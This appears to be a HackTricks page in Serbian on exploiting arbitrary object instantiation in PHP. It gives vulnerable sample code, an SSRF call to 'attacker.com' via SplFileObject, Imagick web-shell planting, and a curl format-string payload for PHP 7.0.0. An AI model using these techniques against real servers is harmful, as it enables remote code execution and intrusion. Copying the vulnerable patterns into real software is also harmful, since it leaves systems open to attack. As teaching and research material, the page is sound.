# PHP - RCE zloupotreba kreiranja objekata: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Ovo je u suštini sažetak [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Uvod

Kreiranje proizvoljnih novih objekata, kao što je `new $_GET["a"]($_GET["a"])`, može dovesti do Remote Code Execution (RCE), kako je detaljno opisano u [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ovaj dokument ističe različite strategije za postizanje RCE.

## RCE putem prilagođenih klasa ili autoloadinga

Sintaksa `new $a($b)` se koristi za instanciranje objekta gde **`$a`** predstavlja ime klase, a **`$b`** je prvi argument koji se prosleđuje konstruktoru. Ove promenljive mogu poticati iz inputa korisnika poput GET/POST, gde mogu biti stringovi ili nizovi, ili iz JSON-a, gde se mogu pojaviti kao drugi tipovi.

Razmotrite sledeći kod:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
U ovom slučaju, postavljanje `$a` na `App` ili `App2` i `$b` na sistemsku naredbu (npr. `uname -a`) dovodi do izvršavanja te naredbe.

**Funkcije za automatsko učitavanje** mogu biti iskorišćene ako takve klase nisu direktno dostupne. Ove funkcije automatski učitavaju klase iz fajlova kada su potrebne i definišu se pomoću `spl_autoload_register` ili `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Ponašanje automatskog učitavanja (autoloading) varira u zavisnosti od verzije PHP-a, što pruža različite mogućnosti za RCE.

## RCE kroz ugrađene klase

U nedostatku prilagođenih klasa ili autoloadera, **ugrađene PHP klase** mogu biti dovoljne za RCE. Broj ovih klasa kreće se između 100 i 200, zavisno od verzije PHP-a i ekstenzija. Mogu se nabrojati koristeći `get_declared_classes()`.

Konstruktori od interesa mogu se identifikovati putem reflection API-ja, kao što je prikazano u sledećem primeru i na linku [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE putem specifičnih metoda uključuje:**

### **SSRF + Phar Deserialization**

Klasa `SplFileObject` omogućava SSRF kroz njen konstruktor, dozvoljavajući konekcije na bilo koji URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF može dovesti do deserializacionih napada u verzijama PHP-a pre 8.0 koristeći Phar protokol.

### **Exploiting PDOs**

Konstruktor klase PDO omogućava konekcije ka bazama podataka preko DSN stringova, potencijalno omogućavajući kreiranje fajlova ili druge interakcije:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Verzije PHP-a do 5.3.22 i 5.4.12 bile su podložne XXE napadima kroz konstruktore `SoapClient` i `SimpleXMLElement`, u zavisnosti od verzije libxml2.

## RCE via Imagick Extension

U analizi zavisnosti projekta otkriveno je da se `Imagick` može iskoristiti za izvršavanje komandi instanciranjem novih objekata. To predstavlja mogućnost za eksploataciju ranjivosti.

### VID parser

Identifikovana je sposobnost VID parser-a da upisuje sadržaj na bilo koju zadatu putanju u datotečnom sistemu. To može dovesti do postavljanja PHP shell-a u direktorijum dostupan preko weba, ostvarujući Remote Code Execution (RCE).

#### VID Parser + File Upload

Primećeno je da PHP privremeno smešta upload-ovane fajlove u `/tmp/phpXXXXXX`. VID parser u `Imagick`, koristeći `msl` protokol, može da rukuje wildcard-ima u putanjama fajlova, olakšavajući premeštanje privremenog fajla na željenu lokaciju. Ovaj metod nudi dodatni pristup za proizvoljno upisivanje fajlova u datotečni sistem.

### PHP Crash + Brute Force

Metod opisan u [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) uključuje upload fajlova koji izazovu pad servera pre nego što budu obrisani. Brute-forcing imena privremenog fajla može omogućiti `Imagick`-u da izvrši proizvoljan PHP kod. Međutim, ova tehnika je bila efikasna samo u zastareloj verziji ImageMagick-a.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Kada korisnički unos kontroliše ime klase (npr. `new $_GET['model']()`), PHP 7.0.0 je uveo privremeni bag tokom refaktorisanja `Throwable` gde je engine pogrešno tretirao ime klase kao printf format string prilikom rezolucije. Ovo omogućava klasične printf-style primitive unutar PHP-a: leaks sa `%p`, kontrolu broja upisa pomoću width specifikatora, i proizvoljne upise sa `%n` protiv in-process pokazivača (na primer, GOT unosi na ELF build-ovima).

Minimalni ranjiv obrazac za reprodukciju:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Pregled eksploatacije (iz reference):
- Leak adrese pomoću `%p` u nazivu klase da biste pronašli zapisivu metu:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Koristite pozicione parametre i specifikatore širine da postavite tačan broj bajtova, zatim `%n` da upišete tu vrednost na adresu dostupnu na stogu, ciljajući GOT slot (npr. `free`) da ga delimično prepišete u `system`.
- Okidajte preotetu funkciju prosleđivanjem imena klase koje sadrži shell pipe da biste došli do `system("id")`.

Napomene:
- Radi samo na PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); ispravljeno u narednim izdanjima. Ozbiljnost: kritična ako postoji mogućnost proizvoljne instancijacije klase.
- Tipični payloadi povezuju mnogo `%p` da bi prošli kroz stog, zatim `%.<width>d%<pos>$n` da bi se izvršilo parcijalno prepisivanje.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
